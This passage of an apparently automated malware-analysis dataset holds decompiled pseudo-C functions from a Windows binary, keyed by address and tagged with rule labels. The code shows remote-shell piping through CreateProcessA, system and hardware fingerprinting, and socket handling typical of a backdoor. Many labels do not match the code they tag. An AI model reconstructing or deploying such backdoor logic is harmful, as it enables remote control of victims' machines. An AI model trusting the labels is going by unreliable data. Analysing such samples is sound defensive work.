     puStack4264 = NULL;\n                        puStack4268 = NULL;\n                        uStack4272 = 0x800;\n                        uStack4276 = 0x488f88;\n                        sub.user32.dll_mouse_event();\n                    }\n                    else {\n                        puStack4252 = &stack0xffffdfc4;\n                        puStack4256 = 0x488fa6;\n                        fcn.00405a44();\n                        puStack4256 = 0x488fb6;\n                        fcn.00405974();\n                        if (uVar3) {\n                            puStack4256 = &fcn.00488d5c::var_8h;\n                            puStack4260 = 0x488fda;\n                            fcn.00405a44();\n                            puStack4260 = 0x488fe2;\n                            fcn.00461b14();\n                        }\n                        else {\n                            puStack4256 = &stack0xffffdfc0;\n                            puStack4260 = 0x489000;\n                            fcn.00405a44();\n                            puStack4260 = 0x489010;\n                            fcn.00405974();\n                            if (uVar3) {\n                                puStack4260 = &fcn.00488d5c::var_8h;\n                                puStack4264 = 0x489040;\n                                fcn.00405a44();\n                                puStack4264 = 0x48904a;\n                                fcn.004897c0();\n                            }\n                            else {\n                                puStack4260 = &stack0xffffdfbc;\n                                puStack4264 = 0x489068;\n                                fcn.00405a44();\n                                puStack4264 = 0x489078;\n                                fcn.00405974();\n                                if (uVar3) {\n                                    puStack4264 = &fcn.00488d5c::var_8h;\n                                    puStack4268 = 0x4890a8;\n                                    fcn.00405a44();\n                                    puStack4268 = 0x4890b5;\n                                    fcn.004897c0();\n                                }\n                                else {\n                                    puStack4264 = &stack0xffffdfb8;\n                                    puStack4268 = 0x4890d0;\n                                    fcn.00405a44();\n                                    puStack4268 = 0x4890e0;\n                                    fcn.00405974();\n                                    if (uVar3) {\n                                        puStack4268 = &fcn.00488d5c::var_8h;\n                                        uStack4272 = 0x489110;\n                                        fcn.00405a44();\n                                        uStack4272 = 0x48911d;\n                                        fcn.004897c0();\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    *in_FS_OFFSET = puStack4268;\n                }\n            }\n        }\n    }\ncode_r0x0048913e:\n    uStack4220 = 2;\n    puStack4224 = *(iVar1 + 0x44);\n    puStack4228 = 0x48914c;\n    sub.wsock32.dll_shutdown();\n    puStack4228 = *(iVar1 + 0x44);\n    uStack4232 = 0x489158;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStack4228;\n    uStack4220 = 0x48918a;\n    puStack4224 = 0x489175;\n    fcn.00405554();\n    puStack4224 = 0x489182;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2201
    },
    "00489dc0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00489dc0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack18844;\n    uint auStack18840 [7];\n    uchar auStack18812 [9216];\n    uchar auStack9596 [2872];\n    uint uStack6724;\n    uchar *puStack6720;\n    uchar *puStack6716;\n    uchar *puStack6708;\n    uint uStack6704;\n    uint *puStack6700;\n    uint uStack6696;\n    uint uStack6692;\n    uint uStack6688;\n    uint uStack6684;\n    uchar *puStack6680;\n    uint *puStack6676;\n    uint uStack6672;\n    uchar *puStack6668;\n    uint *puStack6664;\n    uint *puStack6660;\n    uint *puStack6656;\n    uint uStack6652;\n    uint uStack6648;\n    uint uStack6644;\n    uchar *puStack6640;\n    uint *puStack6636;\n    uint *puStack6632;\n    uint uStack6628;\n    uint *puStack6624;\n    uint uStack6620;\n    uint *puStack6616;\n    int32_t iStack6612;\n    uint *puStack6608;\n    uint uStack6604;\n    uint *puStack6600;\n    uint *puStack6596;\n    uint *puStack6592;\n    uint uStack6588;\n    uint uStack6584;\n    uint uStack6580;\n    uchar *puStack6576;\n    uint var_178h;\n    uchar *var_74h;\n    uint var_70h;\n    uint var_64h;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack6576 = &stack0xfffffffc;\n    iVar3 = 4;\n    do {\n        iVar2 = iVar3;\n        iVar3 = iVar2 + -1;\n    } while (iVar2 + -1 != 0);\n    uStack18844 = 0;\n    var_4h = 0;\n    uStack6580 = 0x48a08e;\n    uStack6584 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe648;\n    *(iVar2 + 0x48) = 0;\n    uStack6588 = 0x489e0e;\n    puStack6660 = fcn.00402f00();\n    *puStack6660 = 0xc;\n    puStack6660[2] = 0xffffffff;\n    puStack6660[1] = 0;\n    uStack6588 = 0;\n    puStack6596 = &fcn.00489dc0::var_ch;\n    puStack6600 = &fcn.00489dc0::var_8h;\n    uStack6604 = 0x489e32;\n    puStack6592 = puStack6660;\n    sub.kernel32.dll_CreatePipe();\n    uStack6604 = 0;\n    iStack6612 = iVar2 + 0x40;\n    puStack6616 = &fcn.00489dc0::var_10h;\n    uStack6620 = 0x489e42;\n    puStack6608 = puStack6660;\n    sub.kernel32.dll_CreatePipe();\n    uStack6620 = 0x104;\n    puStack6624 = &fcn.00489dc0::var_178h;\n    uStack6628 = 0x48a09c;\n    puStack6632 = 0x489e58;\n    sub.kernel32.dll_GetEnvironmentVariableA();\n    puStack6632 = 0x489e67;\n    fcn.00403af4();\n    var_64h = 0x44;\n    var_38h = 0x101;\n    var_34h._0_2_ = 0;\n    var_2ch = var_10h;\n    var_28h = var_ch;\n    var_24h = var_ch;\n    puStack6632 = &fcn.00489dc0::var_74h;\n    puStack6636 = &fcn.00489dc0::var_64h;\n    puStack6640 = NULL;\n    uStack6644 = 0;\n    uStack6648 = 0;\n    uStack6652 = 0xffffffff;\n    puStack6664 = &fcn.00489dc0::var_178h;\n    puStack6668 = NULL;\n    uStack6672 = 0x489ead;\n    puStack6656 = puStack6660;\n    iVar3 = sub.kernel32.dll_CreateProcessA();\n    if (iVar3 != 0) {\n        while (*(iVar2 + 0xd) == '\\0') {\n            puStack6640 = 0x7d0;\n            puStack6676 = 0x489eca;\n            sub.kernel32.dll_Sleep_2();\n            while( true ) {\n                uStack6644 = 1;\n                uStack6648 = 0;\n                uStack6652 = 0;\n                puStack6656 = NULL;\n                puStack6660 = &stack0xffffb668;\n                puStack6664 = 0x489ef8;\n                iVar3 = sub.user32.dll_PeekMessageA();\n                if (iVar3 == 0) break;\n                puStack6664 = &stack0xffffb668;\n                puStack6668 = 0x489ed8;\n                sub.user32.dll_TranslateMessage();\n                puStack6640 = &stack0xffffb668;\n                uStack6672 = 0x489ee4;\n                sub.user32.dll_DispatchMessageA();\n            }\n            *(iVar2 + 0x48) = 1;\n            puStack6664 = &fcn.00489dc0::var_18h;\n            puStack6668 = var_74h;\n            uStack6672 = 0x489f0d;\n            sub.kernel32.dll_GetExitCodeProcess();\n            if (var_18h != 0x103) break;\n            uStack6672 = 0x489f22;\n            fcn.00405530();\n            uStack6672 = 0;\n            puStack6676 = &fcn.00489dc0::var_14h;\n            puStack6680 = NULL;\n            uStack6684 = 0;\n            uStack6688 = 0;\n            uStack6692 = var_8h;\n            uStack6696 = 0x489f37;\n            sub.kernel32.dll_PeekNamedPipe();\n            uVar1 = uStack6692;\n            uStack6692 = var_8h;\n            while (var_8h = uStack6692,  var_14h != 0) {\n                uStack6696 = 0;\n                puStack6700 = &fcn.00489dc0::var_14h;\n                uStack6704 = 0x2400;\n                puStack6708 = &stack0xffffda84;\n                puStack6716 = 0x489f5c;\n                iVar3 = sub.kernel32.dll_ReadFile_1();\n                uVar1 = uStack6692;\n                if (iVar3 == 0) break;\n                puStack6716 = &stack0xffffb684;\n                puStack6720 = &stack0xffffda84;\n                uStack6724 = 0x489f73;\n                func_0x00408380();\n                puStack6668 = &stack0xffffb664;\n                uStack6672 = 0x489f90;\n                fcn.004057a0();\n                uStack6672 = 0x489fa3;\n                fcn.00405a44();\n                uStack6672 = 0x489fb1;\n                fcn.00405818();\n                uStack6672 = 0;\n                puStack6676 = &fcn.00489dc0::var_14h;\n                puStack6680 = NULL;\n                uStack6684 = 0;\n                uStack6688 = 0;\n                uStack6692 = var_8h;\n                uStack6696 = 0x489fc6;\n                sub.kernel32.dll_PeekNamedPipe();\n                uVar1 = uStack6692;\n                uStack6692 = var_8h;\n            }\n            uStack6692 = uVar1;\n            var_20h = var_4h;\n            if (var_4h != 0) {\n                var_20h = *(var_4h + -4);\n            }\n            if (0 < var_20h) {\n                uStack6696 = 0x489ffb;\n                iVar3 = fcn.0041f9e0();\n                *(iVar3 + 0xf) = 1;\n                uStack6696 = 0x48a00a;\n                fcn.0041fbec();\n                uStack6696 = 0x48a014;\n                fcn.00489d00();\n                uStack6696 = 0x48a01e;\n                fcn.00489cb0();\n                uStack6696 = 0x48a028;\n                fcn.00489cfc();\n                uStack6696 = 0x48a02f;\n                fcn.0041fe9c();\n                uStack6696 = 0x48a036;\n                fcn.0041fecc();\n            }\n        }\n    }\n    *(iVar2 + 0x48) = 0;\n    uStack6672 = 0;\n    puStack6676 = var_74h;\n    puStack6680 = 0x48a04f;\n    sub.kernel32.dll_TerminateProcess();\n    puStack6680 = var_74h;\n    uStack6684 = 0x48a058;\n    sub.kernel32.dll_CloseHandle_1();\n    uStack6684 = var_70h;\n    uStack6688 = 0x48a061;\n    sub.kernel32.dll_CloseHandle_1();\n    uStack6688 = 0x48a068;\n    fcn.00402f1c();\n    *in_FS_OFFSET = uStack6684;\n    puStack6676 = 0x48a095;\n    puStack6680 = 0x48a085;\n    fcn.00405554();\n    puStack6680 = 0x48a08d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 2376
    },
    "0048a0a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a0a4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb8;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint lpNumberOfBytesWritten;\n    int32_t var_4h;\n    \n    puStack24 = 0x48a0b9;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack28 = 0x48a11e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x48) != '\\0') {\n        iVar2 = var_4h;\n        if (var_4h != 0) {\n            iVar2 = *(var_4h + -4);\n        }\n        puStack24 = &stack0xfffffffc;\n        uVar1 = fcn.004059dc(iVar2, &fcn.0048a0a4::lpNumberOfBytesWritten, 0);\n        sub.kernel32.dll_WriteFile_1(*(in_EAX + 0x40), uVar1);\n        in_stack_ffffffb8 = *(in_EAX + 0x40);\n        sub.kernel32.dll_WriteFile_1(in_stack_ffffffb8, 0x48a134, 2, &fcn.0048a0a4::lpNumberOfBytesWritten, 0);\n    }\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00405530(0x48a125);\n    return;\n}\n",
        "token_count": 393
    },
    "0048a278": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a278(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    puStack44 = 0x48a292;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    puStack44 = 0x48a29a;\n    fcn.004059cc();\n    uStack48 = 0x48a328;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    if (var_4h != 0) {\n        var_4h = *(var_4h + -4);\n    }\n    var_ch = var_4h >> 0x1f;\n    arg_8h = &fcn.0048a278::var_1ch;\n    puStack44 = &stack0xfffffffc;\n    var_10h = var_4h;\n    fcn.0040ef4c(arg_8h, *0x48a338);\n    var_18h = var_1ch;\n    if (var_1ch != 0) {\n        var_18h = *(var_1ch + -4);\n    }\n    var_14h = var_18h >> 0x1f;\n    *in_FS_OFFSET = arg_8h;\n    iStack52 = 0x48a32f;\n    fcn.00405530();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 446
    },
    "0048a33c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a33c(uint param_1, uint param_2)\n\n{\n    fcn.0040a554();\n    fcn.00405a44(param_2);\n    return;\n}\n",
        "token_count": 48
    },
    "0048a3f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048a3f0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x48a49f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x48a4a6);\n    return;\n}\n",
        "token_count": 329
    },
    "0048a4b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048a4b8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x48a567;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x48a56e);\n    return;\n}\n",
        "token_count": 326
    },
    "0048a580": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048a580(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x48a62f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x48a636);\n    return;\n}\n",
        "token_count": 324
    },
    "0048a6dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048a752)\n// WARNING: Removing unreachable block (ram,0x0048a764)\n\nvoid fcn.0048a6dc(void)\n\n{\n    char in_AL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x48a7ed;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48a7c8;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00421670();\n    fcn.0042174c();\n    fcn.00421890();\n    if (in_AL != '\\0') {\n        fcn.00409b84();\n    }\n    fcn.00422014();\n    fcn.00405584();\n    fcn.00421fb4();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x48a7cf;\n    uStack44 = 0x48a7ba;\n    fcn.00404650();\n    uStack44 = 2;\n    uStack48 = 0;\n    sub.user32.dll_SystemParametersInfoA(0x14, 0);\n    return;\n}\n",
        "token_count": 368
    },
    "0048b61c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048b61c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint pszPath;\n    uint pidl;\n    int32_t var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_114h = 0;\n    var_4h = 0;\n    uStack296 = 0x48b6dc;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack300;\n    sub.shell32.dll_SHGetSpecialFolderLocation(0);\n    sub.shell32.dll_SHGetPathFromIDListA(pidl, &pszPath);\n    fcn.0040aab0();\n    uVar1 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_114h;\n    fcn.00405530(0x48b6e3);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 289
    },
    "0048bf74": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048bf74(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack192;\n    uint uStack188;\n    uchar *puStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint lpHwProfileInfo;\n    uint var_83h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack172 = &stack0xfffffffc;\n    puStack184 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack176 = 0x48c10a;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack180;\n    uStack188 = 0x48c0c8;\n    iStack192 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack192;\n    iVar1 = sub.advapi32.dll_GetCurrentHwProfileA(&lpHwProfileInfo);\n    if (iVar1 == 0) {\n        fcn.0048a3f0();\n        fcn.0040a5dc();\n        fcn.00405818();\n        fcn.0048d16c();\n        iVar2 = 0x48c138;\n        iVar1 = var_8h;\n        fcn.004058e0(0x48c138, var_8h, 0x48c12c);\n        *in_FS_OFFSET = iVar2;\n    }\n    else {\n        fcn.004057a0();\n        fcn.00405a44(&var_4h);\n        fcn.0048a3f0();\n        fcn.0040a5dc();\n        fcn.00405818();\n        fcn.0048d16c();\n        iVar2 = 0x48c138;\n        iVar1 = var_4h;\n        fcn.004058e0(0x48c138, var_8h, 0x48c144);\n        *in_FS_OFFSET = iVar2;\n    }\n    *in_FS_OFFSET = iVar1;\n    fcn.00405554(0x48c111);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 541
    },
    "0048dc14": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048dd68)\n\nvoid fcn.0048dc14(void)\n\n{\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack200;\n    uint uStack184;\n    uint uStack180;\n    uchar *puStack176;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    \n    puStack176 = &stack0xfffffffc;\n    uStack180 = 0x48ddeb;\n    uStack184 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack184;\n    fcn.00405584();\n    lpVersionInformation = 0x94;\n    sub.kernel32.dll_GetVersionExA(&lpVersionInformation);\n    if (var_84h == 1) {\n        if (var_8ch == 0) {\n            fcn.00405584();\n        }\n        else if (var_8ch == 10) {\n            fcn.00405584();\n        }\n        else if (var_8ch == 0x5a) {\n            fcn.00405584();\n        }\n    }\n    else if (var_84h == 2) {\n        if (var_90h == 4) {\n            fcn.00405584();\n        }\n        else if (var_90h == 5) {\n            if (var_8ch == 0) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 1) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 2) {\n                fcn.00405584();\n            }\n        }\n        else if (var_90h == 6) {\n            if (var_8ch == 0) {\n                fcn.00405584();\n            }\n            else if (var_8ch == 1) {\n                fcn.00405584();\n            }\n        }\n    }\n    fcn.004057a0();\n    if (var_88h != 0) {\n        uVar3 = *in_EAX;\n        uVar2 = 0x48dee4;\n        uVar1 = 0;\n        fcn.00409e64(var_88h);\n        fcn.004058e0(0x48def0, 0, var_88h, uVar1, uVar2, uVar3);\n    }\n    *in_FS_OFFSET = uStack200;\n    fcn.00405554(0x48ddf2);\n    return;\n}\n",
        "token_count": 626
    },
    "0048e298": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048e298(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *in_stack_fffffcf8;\n    int32_t iStack764;\n    uint uStack760;\n    uchar *puStack756;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b2h;\n    uint var_48h;\n    int32_t var_44h;\n    ushort var_40h;\n    uint var_3eh;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack756 = 0x48e2b5;\n    fcn.004059cc();\n    uStack760 = 0x48e426;\n    iStack764 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd04;\n    puStack756 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_48h._0_1_ = 0x32;\n    sub.netapi32.dll_Netbios(&fcn.0048e298::var_48h);\n    fcn.00403af4();\n    fcn.00403af4();\n    fcn.00405a3c();\n    fcn.004030fc();\n    var_48h._0_1_ = 0x33;\n    var_18h._0_1_ = 0;\n    var_40h = 0x26a;\n    iVar1 = fcn.00402f00();\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else {\n        var_44h = iVar1;\n        sub.netapi32.dll_Netbios(&fcn.0048e298::var_48h);\n        fcn.004030fc();\n        in_stack_fffffcf8 = &fcn.0048e298::var_8h;\n        fcn.0040afa0(in_stack_fffffcf8);\n        fcn.00402f1c();\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = in_stack_fffffcf8;\n    fcn.00405554(0x48e42d);\n    return;\n}\n",
        "token_count": 603
    },
    "0048eaec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048eaec(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack24 = 0x48eb72;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.0040a694();\n    fcn.00405a44(&var_4h);\n    do {\n        sub.kernel32.dll_Sleep_2();\n        fcn.00473610();\n        fcn.0048e8bc();\n    } while( true );\n}\n",
        "token_count": 167
    },
    "004015ec": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.004015ec(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t **in_EAX;\n    uint32_t uVar5;\n    \n    piVar2 = in_EAX[1];\n    piVar3 = *in_EAX;\n    *piVar2 = piVar3;\n    piVar3[1] = piVar2;\n    if (piVar2 == piVar3) {\n        uVar5 = piVar2 + -0x1259ea >> 8 & 0xff;\n        uVar4 = piVar2 + -0x1259ea >> 3 & 0x1f;\n        puVar1 = uVar5 * 4 + 0x496728;\n        *puVar1 = *puVar1 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n        if (*puVar1 == 0) {\n            uVar4 = uVar5 & 0x1f;\n            *0x496724 = *0x496724 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "0040162c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040162c(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = param_2 - 0xb30U >> 8;\n    iVar4 = (uVar3 - 0x3ff & -(uVar3 < 0x3ff)) + 0x3ff;\n    uVar3 = iVar4 * 8;\n    ppiVar2 = *(uVar3 + 0x4967ac);\n    *in_EAX = uVar3 + 0x4967a8;\n    in_EAX[1] = ppiVar2;\n    *ppiVar2 = in_EAX;\n    *(uVar3 + 0x4967ac) = in_EAX;\n    if (ppiVar2 != uVar3 + 0x4967a8) {\n        return;\n    }\n    uVar3 = uVar3 >> 8 & 0xff;\n    puVar1 = uVar3 * 4 + 0x496728;\n    *puVar1 = *puVar1 | 1 << (iVar4 & 0x1f);\n    *0x496724 = *0x496724 | 1 << (uVar3 & 0x1f);\n    return;\n}\n",
        "token_count": 320
    },
    "00401a0c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint8_t ** fcn.00401a0c(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    uint16_t uVar5;\n    uint8_t *puVar6;\n    uint8_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t **ppuVar9;\n    uint8_t *in_EAX;\n    uint8_t **ppuVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    \n    if (0xa2c < in_EAX) {\n        if (0x40a2c < in_EAX) {\n            if (in_EAX < 0) {\n                return NULL;\n            }\n            ppuVar10 = sub.kernel32.dll_VirtualAlloc(0, in_EAX + 0x10013 & 0xffff0000, 0x101000, 4);\n            if (ppuVar10 != NULL) {\n                ppuVar10[2] = in_EAX;\n                ppuVar10[3] = in_EAX + 0x10013 & 0xffff0000 | 4;\n                fcn.00401770();\n                ppuVar8 = *0x4987b0;\n                *ppuVar10 = 0x4987ac;\n                ppuVar9 = ppuVar10;\n                ppuVar10[1] = *0x4987b0;\n                *0x4987b0 = ppuVar9;\n                *ppuVar8 = ppuVar10;\n                *0x4987a8 = 0;\n                ppuVar10 = ppuVar10 + 4;\n            }\n            return ppuVar10;\n        }\n        uVar17 = in_EAX + 0xd3 & 0xffffff00;\n        uVar18 = uVar17 + 0x30;\n        if (*0x49604d != '\\0') {\n            while( true ) {\n                LOCK();\n                bVar19 = *0x496718 == 0;\n                *0x496718 = *0x496718 ^ bVar19 * (*0x496718 ^ 1);\n                if (bVar19) break;\n                if (*0x4965b5 == '\\0') 